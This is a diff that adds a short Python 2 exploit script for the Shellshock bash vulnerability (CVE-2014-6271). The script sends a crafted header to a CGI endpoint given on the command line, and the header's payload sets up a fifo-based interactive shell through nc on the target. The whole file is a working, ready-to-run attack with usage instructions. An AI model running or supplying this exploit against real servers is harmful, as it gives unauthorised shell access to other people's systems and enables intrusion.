@@ -1,0 +1,23 @@
+#!/usr/bin/env python
+#
+# CVE-2014-6271 cgi-bin reverse shell
+# https://news.ycombinator.com/item?id=8361574
+#
+
+import httplib,urllib,sys
+
+if (len(sys.argv)<3):
+	print "Usage: %s <host> <vulnerable CGI>" % sys.argv[0]
+	print "Example: %s localhost /cgi-bin/test.cgi" % sys.argv[0]
+	exit(0)
+
+conn = httplib.HTTPConnection(sys.argv[1])
+reverse_shell="() { ignored;};/bin/bash -c '/bin/rm -f /tmp/f; /usr/bin/mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 1234 > /tmp/f'"
+
+headers = {"Content-type": "application/x-www-form-urlencoded",
+	"test":reverse_shell }
+conn.request("GET",sys.argv[2],headers=headers)
+res = conn.getresponse()
+print res.status, res.reason
+data = res.read()
+print data
